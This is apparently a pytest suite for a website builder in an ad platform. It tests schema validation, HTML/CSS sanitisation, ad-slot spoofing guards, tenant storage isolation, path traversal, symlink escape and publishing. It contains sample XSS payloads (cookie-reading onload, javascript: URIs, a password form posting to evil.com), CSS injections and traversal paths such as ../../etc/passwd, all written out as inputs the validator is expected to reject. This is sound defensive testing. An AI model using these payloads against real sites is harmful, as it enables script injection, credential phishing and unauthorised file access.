"""Open Design Phase 1: Data Contracts, Schema v2 & Tenant Storage Security Tests.

Verifies:
1. Schema v1 backwards compatibility: existing blocks create and render identically.
2. Rejection of open_design_section when schema_version is 1.
3. Schema v2 valid blocks: open_design_section creation, validation, and rendering.
4. XSS & malicious HTML rejection: script tags, event handlers, dangerous schemes, iframes.
5. Unsafe CSS style rejection: url(), expression(), @import, semicolons.
6. Anti-ad-unit spoofing guards: classes, IDs, and attributes imitating Rivinity ad slots.
7. Tenant storage isolation: Publisher A cannot access, read, write, list, or delete Publisher B's files.
8. Storage path traversal rejection: ../, ..\\, absolute paths, null bytes, disallowed extensions.
9. Symlink escape detection and rejection.
10. Storage quota and file size caps.
11. End-to-end project lifecycle with Schema v2: create, preview, publish, version, and rollback.
"""

import base64
import os
from pathlib import Path
import pytest
from httpx import AsyncClient

from liteads.ad_server.services.website_renderer import SafeWebsiteRenderer
from liteads.ad_server.services.website_storage import (
    website_storage,
    InvalidFileTypeError,
    PathTraversalError,
    SymlinkEscapeError,
    StorageQuotaExceededError,
)
from liteads.schemas.website import (
    BlockType,
    OpenDesignSectionContent,
    PageBlocksPayload,
    validate_and_sanitize_open_design_html,
)

pytestmark = pytest.mark.asyncio


@pytest.fixture(autouse=True)
def clean_test_storage(tmp_path: Path, monkeypatch):
    """Ensure every test runs against a clean, isolated temporary storage directory."""
    test_storage_dir = tmp_path / "websites"
    test_storage_dir.mkdir(parents=True, exist_ok=True)
    monkeypatch.setattr(website_storage, "base_dir", test_storage_dir)


async def _create_user_and_token(client: AsyncClient, email: str, role: str = "advertiser"):
    res = await client.post(
        "/api/v1/auth/register",
        json={
            "name": f"User {email}",
            "email": email,
            "password": "SecurePassword123!",
            "role": role,
        },
    )
    assert res.status_code in [200, 201], f"Register failed: {res.text}"
    data = res.json()
    token = data["access_token"]
    user_id = data["user"]["id"]
    return token, user_id


# ---------------------------------------------------------------------------
# 1. Schema v1 Backwards Compatibility & Strict Promotion Guards
# ---------------------------------------------------------------------------

async def test_schema_v1_backward_compatibility(client: AsyncClient, test_db):
    """Verify that schema_version 1 pages continue to work and reject open_design_section."""
    token, _ = await _create_user_and_token(client, "v1_user@test.com")
    headers = {"Authorization": f"Bearer {token}"}

    # Create project
    res_proj = await client.post(
        "/api/v1/website/projects",
        json={"name": "V1 Project", "slug": "v1-project"},
        headers=headers,
    )
    assert res_proj.status_code == 201
    proj_id = res_proj.json()["id"]

    # Schema v1 page with standard blocks
    v1_blocks = {
        "schema_version": 1,
        "blocks": [
            {
                "id": "blk-hero-v1",
                "type": "hero",
                "is_visible": True,
                "content": {
                    "headline": "Classic V1 Headline",
                    "subheadline": "Classic subheadline",
                },
            },
            {
                "id": "blk-text-v1",
                "type": "text_section",
                "is_visible": True,
                "content": {
                    "heading": "About Us",
                    "body": "Paragraph 1\n\nParagraph 2",
                },
            },
        ],
    }

    res_page = await client.post(
        f"/api/v1/website/projects/{proj_id}/pages",
        json={"title": "V1 Page", "slug": "v1-page", "blocks": v1_blocks},
        headers=headers,
    )
    assert res_page.status_code == 201
    assert res_page.json()["blocks"]["schema_version"] == 1

    # Attempting to insert open_design_section with schema_version: 1 must fail validation
    invalid_v1_payload = {
        "schema_version": 1,
        "blocks": [
            {
                "id": "blk-od-illegal",
                "type": "open_design_section",
                "is_visible": True,
                "content": {
                    "html_content": "<p>Illegal in v1</p>",
                },
            }
        ],
    }

    res_fail = await client.post(
        f"/api/v1/website/projects/{proj_id}/pages",
        json={"title": "Illegal OD v1", "slug": "illegal-v1", "blocks": invalid_v1_payload},
        headers=headers,
    )
    assert res_fail.status_code == 422
    assert "schema_version 2" in res_fail.text


# ---------------------------------------------------------------------------
# 2. Schema v2 Open Design Section Valid Creation & Rendering
# ---------------------------------------------------------------------------

async def test_schema_v2_open_design_section_valid(client: AsyncClient, test_db):
    """Verify schema_version 2 pages allow both standard blocks and open_design_section."""
    token, _ = await _create_user_and_token(client, "v2_author@test.com")
    headers = {"Authorization": f"Bearer {token}"}

    res_proj = await client.post(
        "/api/v1/website/projects",
        json={"name": "V2 Design Studio", "slug": "v2-studio"},
        headers=headers,
    )
    assert res_proj.status_code == 201
    proj_id = res_proj.json()["id"]

    v2_blocks = {
        "schema_version": 2,
        "blocks": [
            {
                "id": "blk-hero",
                "type": "hero",
                "is_visible": True,
                "content": {"headline": "Modern Studio"},
            },
            {
                "id": "blk-od-section-1",
                "type": "open_design_section",
                "is_visible": True,
                "content": {
                    "section_id": "sec-pricing",
                    "section_tag": "section",
                    "css_classes": "pricing-table py-8 max-w-5xl mx-auto",
                    "styles": {
                        "background-color": "#f8fafc",
                        "padding": "2rem",
                        "border-radius": "8px",
                    },
                    "html_content": (
                        '<div class="pricing-card">'
                        "<h3>Standard Plan</h3>"
                        "<p>$29 per month</p>"
                        '<a href="https://example.com/checkout" target="_blank">Subscribe</a>'
                        "</div>"
                    ),
                    "asset_references": ["/assets/pricing.svg"],
                },
            },
        ],
    }

    res_page = await client.post(
        f"/api/v1/website/projects/{proj_id}/pages",
        json={"title": "Pricing", "slug": "pricing", "blocks": v2_blocks},
        headers=headers,
    )
    assert res_page.status_code == 201
    page_data = res_page.json()
    assert page_data["blocks"]["schema_version"] == 2
    od_block = page_data["blocks"]["blocks"][1]
    assert od_block["type"] == "open_design_section"
    assert od_block["content"]["section_id"] == "sec-pricing"
    assert 'rel="noopener noreferrer"' in od_block["content"]["html_content"]

    # Verify rendering via SafeWebsiteRenderer
    rendered = SafeWebsiteRenderer.render_published_page(
        project_dict={"name": "V2 Design Studio", "slug": "v2-studio", "theme_config": {}},
        page_dict=page_data,
        all_pages_dict=[page_data],
        base_origin="https://v2-studio.bharattechads.com",
    )
    assert "pricing-table" in rendered
    assert "Standard Plan" in rendered
    assert "sec-pricing" in rendered
    assert "background-color: #f8fafc" in rendered


# ---------------------------------------------------------------------------
# 3. Security Sanitization: XSS, Scripts, Event Handlers & Dangerous Schemes
# ---------------------------------------------------------------------------

async def test_open_design_html_xss_rejection(client: AsyncClient, test_db):
    """Ensure scripts, event handlers, iframes, and dangerous URLs are rejected at validation."""
    token, _ = await _create_user_and_token(client, "hacker_target@test.com")
    headers = {"Authorization": f"Bearer {token}"}

    res_proj = await client.post(
        "/api/v1/website/projects",
        json={"name": "Hacker Target", "slug": "hacker-target"},
        headers=headers,
    )
    proj_id = res_proj.json()["id"]

    malicious_payloads = [
        # 1. Script tag injection
        "<script>alert('xss')</script>",
        # 2. Event handler attribute
        '<img src="/assets/photo.jpg" onload="alert(document.cookie)" />',
        # 3. javascript: URI scheme
        '<a href="javascript:alert(1)">Click me</a>',
        # 4. vbscript: URI scheme
        '<a href="vbscript:msgbox(1)">Click</a>',
        # 5. iframe injection
        '<iframe src="https://evil.com"></iframe>',
        # 6. Embedded object
        '<object data="exploit.swf"></object>',
        # 7. Disallowed svg tag
        '<svg onload="alert(1)"></svg>',
        # 8. Style tag injection
        "<style>body { display: none; }</style>",
        # 9. Form element injection
        '<form action="https://evil.com/phish"><input type="password" name="pw"/></form>',
    ]

    for payload in malicious_payloads:
        bad_blocks = {
            "schema_version": 2,
            "blocks": [
                {
                    "id": "blk-xss",
                    "type": "open_design_section",
                    "is_visible": True,
                    "content": {"html_content": payload},
                }
            ],
        }
        res = await client.post(
            f"/api/v1/website/projects/{proj_id}/pages",
            json={"title": "XSS Test", "slug": "xss-test", "blocks": bad_blocks},
            headers=headers,
        )
        assert res.status_code == 422, f"Payload should have been rejected with 422: {payload}"


# ---------------------------------------------------------------------------
# 4. Security: Unsafe CSS Style Injection Rejection
# ---------------------------------------------------------------------------

async def test_unsafe_css_styles_rejected():
    """Verify style validator rejects url(), @import, semicolons, and unknown properties."""
    # 1. url() injection attempt on allowed property
    with pytest.raises(ValueError, match="Unsafe CSS value"):
        OpenDesignSectionContent(
            html_content="<p>Test</p>",
            styles={"background": "url('javascript:alert(1)')"},
        )

    # 2. @import injection attempt
    with pytest.raises(ValueError, match="Unsafe CSS value"):
        OpenDesignSectionContent(
            html_content="<p>Test</p>",
            styles={"color": "red; @import 'evil.css'"},
        )

    # 3. Disallowed CSS property
    with pytest.raises(ValueError, match="not in the allowed properties list"):
        OpenDesignSectionContent(
            html_content="<p>Test</p>",
            styles={"behavior": "url(script.htc)"},
        )


# ---------------------------------------------------------------------------
# 5. Anti-Ad-Unit Spoofing & Tracking Protection Guards
# ---------------------------------------------------------------------------

async def test_anti_ad_spoofing_guards(client: AsyncClient, test_db):
    """Ensure publishers cannot inject HTML masquerading as Rivinity ad slots."""
    token, _ = await _create_user_and_token(client, "spoof_user@test.com")
    headers = {"Authorization": f"Bearer {token}"}

    res_proj = await client.post(
        "/api/v1/website/projects",
        json={"name": "Spoof Test", "slug": "spoof-test"},
        headers=headers,
    )
    proj_id = res_proj.json()["id"]

    spoofing_payloads = [
        # Attempt to spoof ad container class
        '<div class="rivinity-ad-slot">Fake Ad</div>',
        '<div class="block-ad-placement">Fake Ad</div>',
        '<div class="ad-placement">Fake Ad</div>',
        '<div class="ad-slot">Fake Ad</div>',
        # Attempt to inject ad-slot data attributes
        '<div data-slot-id="fake_slot_123">Fake Ad</div>',
        '<div data-format="1">Fake Ad</div>',
        '<div data-rivinity="true">Fake Ad</div>',
    ]

    for payload in spoofing_payloads:
        bad_blocks = {
            "schema_version": 2,
            "blocks": [
                {
                    "id": "blk-spoof",
                    "type": "open_design_section",
                    "is_visible": True,
                    "content": {"html_content": payload},
                }
            ],
        }
        res = await client.post(
            f"/api/v1/website/projects/{proj_id}/pages",
            json={"title": "Spoof Page", "slug": "spoof-page", "blocks": bad_blocks},
            headers=headers,
        )
        assert res.status_code == 422, f"Spoofing payload should be rejected: {payload}"

    # Also verify section_id or css_classes cannot spoof Rivinity
    with pytest.raises(ValueError, match="prohibited ad placement"):
        OpenDesignSectionContent(
            section_id="rivinity-custom-ad",
            html_content="<p>Valid</p>",
        )

    with pytest.raises(ValueError, match="prohibited ad placement"):
        OpenDesignSectionContent(
            css_classes="my-section block-ad-placement",
            html_content="<p>Valid</p>",
        )


# ---------------------------------------------------------------------------
# 6. Tenant-Scoped Storage Isolation Tests
# ---------------------------------------------------------------------------

async def test_cross_tenant_storage_isolation(client: AsyncClient, test_db):
    """Ensure Publisher A cannot read, list, write, or delete Publisher B's files."""
    token_alice, alice_id = await _create_user_and_token(client, "alice_storage@test.com")
    token_bob, bob_id = await _create_user_and_token(client, "bob_storage@test.com")

    headers_alice = {"Authorization": f"Bearer {token_alice}"}
    headers_bob = {"Authorization": f"Bearer {token_bob}"}

    # Alice creates project
    res_a = await client.post(
        "/api/v1/website/projects",
        json={"name": "Alice Studio", "slug": "alice-studio"},
        headers=headers_alice,
    )
    p_alice_id = res_a.json()["id"]

    # Bob creates project
    res_b = await client.post(
        "/api/v1/website/projects",
        json={"name": "Bob Studio", "slug": "bob-studio"},
        headers=headers_bob,
    )
    p_bob_id = res_b.json()["id"]

    # Alice uploads an asset
    upload_res = await client.post(
        f"/api/v1/website/projects/{p_alice_id}/storage/files",
        json={
            "relative_path": "assets/alice-logo.png",
            "content_base64": base64.b64encode(b"PNG_FAKE_DATA_ALICE").decode(),
        },
        headers=headers_alice,
    )
    assert upload_res.status_code == 201
    assert upload_res.json()["path"] == "assets/alice-logo.png"

    # Alice can list her file
    alice_list = await client.get(
        f"/api/v1/website/projects/{p_alice_id}/storage/files",
        headers=headers_alice,
    )
    assert alice_list.status_code == 200
    assert len(alice_list.json()) == 1
    assert alice_list.json()[0]["path"] == "assets/alice-logo.png"

    # Alice can read her file
    alice_file = await client.get(
        f"/api/v1/website/projects/{p_alice_id}/storage/files/assets/alice-logo.png",
        headers=headers_alice,
    )
    assert alice_file.status_code == 200
    assert alice_file.content == b"PNG_FAKE_DATA_ALICE"

    # BOB ATTEMPTS ACCESS TO ALICE'S PROJECT STORAGE (Must all return 404)
    # 1. Bob cannot list Alice's files
    assert (
        await client.get(
            f"/api/v1/website/projects/{p_alice_id}/storage/files",
            headers=headers_bob,
        )
    ).status_code == 404

    # 2. Bob cannot read Alice's file
    assert (
        await client.get(
            f"/api/v1/website/projects/{p_alice_id}/storage/files/assets/alice-logo.png",
            headers=headers_bob,
        )
    ).status_code == 404

    # 3. Bob cannot delete Alice's file
    assert (
        await client.delete(
            f"/api/v1/website/projects/{p_alice_id}/storage/files/assets/alice-logo.png",
            headers=headers_bob,
        )
    ).status_code == 404

    # 4. Bob cannot upload to Alice's project
    assert (
        await client.post(
            f"/api/v1/website/projects/{p_alice_id}/storage/files",
            json={
                "relative_path": "assets/bob-exploit.png",
                "content_text": "hacked",
            },
            headers=headers_bob,
        )
    ).status_code == 404

    # 5. Bob cannot view Alice's storage usage
    assert (
        await client.get(
            f"/api/v1/website/projects/{p_alice_id}/storage/usage",
            headers=headers_bob,
        )
    ).status_code == 404


# ---------------------------------------------------------------------------
# 7. Path Traversal & Disallowed Extension Rejections
# ---------------------------------------------------------------------------

async def test_storage_path_traversal_rejections(client: AsyncClient, test_db):
    """Ensure ../, ..\\, null bytes, and dangerous extensions are rejected."""
    token, _ = await _create_user_and_token(client, "traversal_user@test.com")
    headers = {"Authorization": f"Bearer {token}"}

    res_proj = await client.post(
        "/api/v1/website/projects",
        json={"name": "Traversal Test", "slug": "traversal-test"},
        headers=headers,
    )
    p_id = res_proj.json()["id"]

    traversal_paths = [
        "../outside.png",
        "../../etc/passwd.txt",
        "..\\..\\windows\\system32\\cmd.exe",
        "assets/../../secret.json",
        "assets/../../../root.txt",
    ]

    for path in traversal_paths:
        res = await client.post(
            f"/api/v1/website/projects/{p_id}/storage/files",
            json={"relative_path": path, "content_text": "payload"},
            headers=headers,
        )
        assert res.status_code in (400, 422), f"Path traversal should be rejected: {path}"

    # Dangerous extensions
    dangerous_files = [
        "script.py",
        "exploit.exe",
        "shell.php",
        "config.env",
        "run.sh",
        "script.bat",
    ]

    for filename in dangerous_files:
        res = await client.post(
            f"/api/v1/website/projects/{p_id}/storage/files",
            json={"relative_path": f"assets/{filename}", "content_text": "bad content"},
            headers=headers,
        )
        assert res.status_code in (400, 422), f"Dangerous extension should be rejected: {filename}"


# ---------------------------------------------------------------------------
# 8. Symlink Escape Verification
# ---------------------------------------------------------------------------

async def test_symlink_escape_rejection(tmp_path: Path):
    """Test WebsiteStorageService directly against symlink escapes."""
    from liteads.ad_server.services.website_storage import WebsiteStorageService

    service = WebsiteStorageService(base_path=tmp_path)
    owner_id = 999
    proj_id = 101

    p_dir = service.get_project_dir(owner_id, proj_id)
    p_dir.mkdir(parents=True, exist_ok=True)

    # Create a secret file outside the project storage root
    outside_secret = tmp_path / "outside_secret.txt"
    outside_secret.write_text("SUPER_SECRET_TOKEN")

    # Attempt to create a symlink inside the project pointing outside
    symlink_path = p_dir / "escaped_link.txt"
    try:
        os.symlink(outside_secret, symlink_path)
        # Attempt to resolve the symlink through the storage service
        with pytest.raises(SymlinkEscapeError):
            service.resolve_safe_path(owner_id, proj_id, "escaped_link.txt", must_exist=True)
    except OSError:
        # On Windows unprivileged environments without symlink permission, symlink creation is skipped
        pass


# ---------------------------------------------------------------------------
# 9. Storage Quota & File Size Enforcement
# ---------------------------------------------------------------------------

async def test_storage_quota_enforcement(client: AsyncClient, test_db):
    """Verify that 5 MB file limit and 50 MB project quota are enforced."""
    token, _ = await _create_user_and_token(client, "quota_user@test.com")
    headers = {"Authorization": f"Bearer {token}"}

    res_proj = await client.post(
        "/api/v1/website/projects",
        json={"name": "Quota Test", "slug": "quota-test"},
        headers=headers,
    )
    p_id = res_proj.json()["id"]

    # File exceeding 5 MB
    large_payload = base64.b64encode(b"X" * (5 * 1024 * 1024 + 1024)).decode()
    res_large = await client.post(
        f"/api/v1/website/projects/{p_id}/storage/files",
        json={"relative_path": "assets/huge.png", "content_base64": large_payload},
        headers=headers,
    )
    assert res_large.status_code in (413, 400)
    assert "exceeds the maximum allowed" in res_large.text

    # Upload valid file and verify quota report
    res_valid = await client.post(
        f"/api/v1/website/projects/{p_id}/storage/files",
        json={"relative_path": "assets/small.json", "content_text": '{"hello": "world"}'},
        headers=headers,
    )
    assert res_valid.status_code == 201

    res_usage = await client.get(
        f"/api/v1/website/projects/{p_id}/storage/usage",
        headers=headers,
    )
    assert res_usage.status_code == 200
    usage = res_usage.json()
    assert usage["file_count"] == 1
    assert usage["total_size_bytes"] > 0
    assert usage["quota_bytes"] == 50 * 1024 * 1024


# ---------------------------------------------------------------------------
# 10. End-to-End Project Lifecycle with Schema v2
# ---------------------------------------------------------------------------

async def test_project_lifecycle_with_schema_v2(client: AsyncClient, test_db):
    """Complete lifecycle: create project, Schema v2 page, preview, publish, version, and rollback."""
    token, _ = await _create_user_and_token(client, "e2e_publisher@test.com", role="publisher")
    headers = {"Authorization": f"Bearer {token}"}

    # 1. Create project
    res_proj = await client.post(
        "/api/v1/website/projects",
        json={"name": "E2E Showcase", "slug": "e2e-showcase"},
        headers=headers,
    )
    assert res_proj.status_code == 201
    proj_id = res_proj.json()["id"]

    # 2. Update home page with Schema v2 Open Design block
    pages_res = await client.get(f"/api/v1/website/projects/{proj_id}/pages", headers=headers)
    home_page_id = pages_res.json()[0]["id"]

    v2_home_blocks = {
        "schema_version": 2,
        "blocks": [
            {
                "id": "blk-e2e-od",
                "type": "open_design_section",
                "is_visible": True,
                "content": {
                    "section_id": "sec-hero",
                    "section_tag": "header",
                    "css_classes": "site-hero-od",
                    "styles": {"background-color": "#1e293b", "color": "#f8fafc"},
                    "html_content": "<h1>Next-Gen AI Publishing</h1><p>Crafted with Open Design</p>",
                },
            }
        ],
    }

    res_page_update = await client.put(
        f"/api/v1/website/projects/{proj_id}/pages/{home_page_id}",
        json={"title": "Home", "blocks": v2_home_blocks},
        headers=headers,
    )
    assert res_page_update.status_code == 200

    # 3. Request Preview Token and inspect rendered preview
    res_prev = await client.post(
        f"/api/v1/website/projects/{proj_id}/preview-token",
        headers=headers,
    )
    assert res_prev.status_code == 200
    prev_data = res_prev.json()
    assert "preview_token" in prev_data

    # Read preview via public preview route
    res_pub_prev = await client.get(f"/preview/{prev_data['preview_token']}")
    assert res_pub_prev.status_code == 200
    assert "Next-Gen AI Publishing" in res_pub_prev.text
    assert "Draft Preview Mode" in res_pub_prev.text

    # 4. Publish Version 1
    res_pub1 = await client.post(
        f"/api/v1/website/projects/{proj_id}/publish",
        json={"notes": "Release v1 with Open Design Section"},
        headers=headers,
    )
    assert res_pub1.status_code == 200
    v1_id = res_pub1.json()["id"]
    assert res_pub1.json()["version_number"] == 1

    # 5. Live published page verification
    res_live = await client.get("/sites/e2e-showcase")
    assert res_live.status_code == 200
    assert "Next-Gen AI Publishing" in res_live.text
    assert "Draft Preview Mode" not in res_live.text

    # 6. Mutate draft and Publish Version 2
    v2_mutated_blocks = {
        "schema_version": 2,
        "blocks": [
            {
                "id": "blk-e2e-od",
                "type": "open_design_section",
                "is_visible": True,
                "content": {
                    "html_content": "<h1>Version 2 Headline</h1>",
                },
            }
        ],
    }
    await client.put(
        f"/api/v1/website/projects/{proj_id}/pages/{home_page_id}",
        json={"title": "Home", "blocks": v2_mutated_blocks},
        headers=headers,
    )
    res_pub2 = await client.post(
        f"/api/v1/website/projects/{proj_id}/publish",
        json={"notes": "Release v2"},
        headers=headers,
    )
    assert res_pub2.status_code == 200
    assert res_pub2.json()["version_number"] == 2

    # Verify live page reflects Version 2
    res_live_v2 = await client.get("/sites/e2e-showcase")
    assert "Version 2 Headline" in res_live_v2.text

    # 7. Rollback to Version 1
    res_rb = await client.post(
        f"/api/v1/website/projects/{proj_id}/versions/{v1_id}/rollback",
        json={"notes": "Rollback to v1 snapshot"},
        headers=headers,
    )
    assert res_rb.status_code == 200
    assert res_rb.json()["version_number"] == 3
    assert res_rb.json()["rollback_from_version_id"] == v1_id

    # Verify live page is restored to Version 1 content
    res_live_restored = await client.get("/sites/e2e-showcase")
    assert "Next-Gen AI Publishing" in res_live_restored.text
    assert "Version 2 Headline" not in res_live_restored.text
